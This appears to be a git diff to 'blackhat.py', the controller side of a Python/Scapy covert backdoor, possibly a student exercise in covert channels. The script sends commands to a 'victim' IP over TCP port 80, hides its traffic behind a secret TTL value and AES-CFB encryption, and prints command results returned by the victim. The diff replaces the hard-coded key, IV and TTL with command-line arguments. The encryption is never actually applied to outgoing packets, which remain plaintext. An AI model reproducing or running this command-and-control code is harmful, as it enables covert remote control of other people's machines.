@@ -32,6 +32,9 @@ import time #used for thread sleep methods
 #################################GLOBAL VARIABLES#################################
 global targetIP
 global sourcePort
+global ttlKey
+global encryptionKey
+global IV
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 --  FUNCTION
@@ -47,15 +50,30 @@ global sourcePort
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def usage():
     global targetIP
-    if len(sys.argv) < 2:
-        print "Please use format python blackhat.py targetIP sourcePort"
+    global ttlKey
+    global encryptionKey
+    global IV
+    if len(sys.argv) < 5:
+        print "Please use format python blackhat.py <targetIP> <sourcePort> <ttlKey> <encryptionKey> <IV>"
         sys.exit()
     else:
+        if len(sys.argv[4]) < 16:
+            print "Please ensure that the key is 16 characters long"
+            sys.exit()
+        if len(sys.argv[5]) < 16:
+            print "Please ensure that the initialization vector is 16 characters long"
+            sys.exit()
         targetIP = sys.argv[1]
         print "START Victim IP is %s"%(targetIP)
         global sourcePort
         sourcePort = sys.argv[2]
         print "START Sending from Blackhat port: %s"%(sourcePort)
+        ttlKey = int(sys.argv[3])
+        print "TTL Key is " + str(ttlKey)
+        encryptionKey = sys.argv[4]
+        print "Encryption key is " + encryptionKey
+        IV = sys.argv[5]
+        print "IV is " + IV
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 --  FUNCTION
@@ -70,9 +88,13 @@ def usage():
 --      Encrypted with AES CFB.
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def encryptCommand(command):
-    key='0123456789abcdef'
-    IV = "abcdefghijklmnop"
-    encryptor = AES.new(key,AES.MODE_CFB,IV=IV)
+    global encryptionKey
+    global ttlKey
+    encryptionKey = encryptionKey
+    ttlKey = ttlKey
+    # key='0123456789abcdef'
+    # IV = "abcdefghijklmnop"
+    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
     return encryptor.encrypt(command)
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
@@ -110,10 +132,12 @@ def sendCommand(command):
 def craftCommandPacket(command):
     global targetIP
     global sourcePort
+    global ttlKey
+
     #TODO:
     # data = encryptMessage(command)
     data = command
-    packet = (IP(dst=targetIP,ttl=71)/TCP(sport=int(sourcePort),dport=80)/ data)
+    packet = (IP(dst=targetIP,ttl=ttlKey)/TCP(sport=int(sourcePort),dport=80)/ data)
     return packet
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
@@ -133,10 +157,11 @@ def craftCommandPacket(command):
 def commandResult(packet):
     if IP in packet[0]:
         global targetIP
+        global ttlKey
         srcIP = packet[IP].src
         ttl = packet[IP].ttl
         # Part of the key that signifies that this packet is for us (TTL = 71)
-        if srcIP == targetIP and ttl == 71:
+        if srcIP == targetIP and ttl == ttlKey:
             print packet.load
             return True
         else:
